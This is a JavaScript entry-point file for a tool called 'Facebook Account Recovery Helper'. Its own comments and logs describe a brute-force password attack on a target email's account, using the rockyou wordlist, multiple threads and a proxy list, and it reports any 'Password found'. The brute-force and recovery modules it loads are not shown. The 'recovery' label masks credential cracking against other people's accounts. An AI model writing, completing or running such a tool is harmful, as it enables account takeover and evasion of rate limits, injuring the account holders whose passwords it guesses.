const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

/**
 * Main entry point for Facebook Account Recovery Helper.
 * Orchestrates the brute-force recovery process.
 */
class AccountRecoveryHelper {
    constructor(configPath) {
        this.config = this._loadConfig(configPath);
        this.recoveryModule = require('./recoveryEngine');
        this.bruteForce = require('./bruteForce');
        this.logger = require('./logger');
    }

    _loadConfig(configPath) {
        const defaultConfig = {
            targetEmail: '',
            wordlistPath: './wordlists/rockyou.txt',
            maxThreads: 4,
            delayBetweenAttempts: 1000,
            proxyList: []
        };
        if (fs.existsSync(configPath)) {
            const userConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            return { ...defaultConfig, ...userConfig };
        }
        return defaultConfig;
    }

    async start() {
        this.logger.info('Starting Facebook account recovery brute-force...');
        this.logger.info(`Target email: ${this.config.targetEmail}`);
        
        const engine = new this.recoveryModule.RecoveryEngine(this.config);
        const brute = new this.bruteForce.BruteForce(this.config);
        
        try {
            const result = await brute.execute(engine);
            if (result.success) {
                this.logger.success(`Password found: ${result.password}`);
            } else {
                this.logger.error('Password not found in wordlist');
            }
        } catch (err) {
            this.logger.error(`Fatal error: ${err.message}`);
            process.exit(1);
        }
    }
}

// CLI handler
if (require.main === module) {
    const helper = new AccountRecoveryHelper('./config.json');
    helper.start();
}

module.exports = AccountRecoveryHelper;
